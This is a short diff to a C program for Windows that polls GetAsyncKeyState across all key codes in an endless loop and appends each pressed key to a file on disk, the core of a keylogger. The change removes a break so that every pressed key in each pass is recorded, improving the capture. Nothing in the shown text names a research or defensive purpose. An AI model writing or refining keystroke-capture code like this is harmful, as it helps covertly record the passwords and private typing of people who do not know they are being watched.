@@ -21,10 +21,8 @@ int main(int argc, char **argv){
     while(true){
         for(i = 0; i < 255; i++){
             state = GetAsyncKeyState(i);
-            if(state == 1 || state == -32767){
+            if(state == 1 || state == -32767)
                 save_file(fullpath, key_value(i));
-                break;
-            }
         }
         Sleep(1);
     }
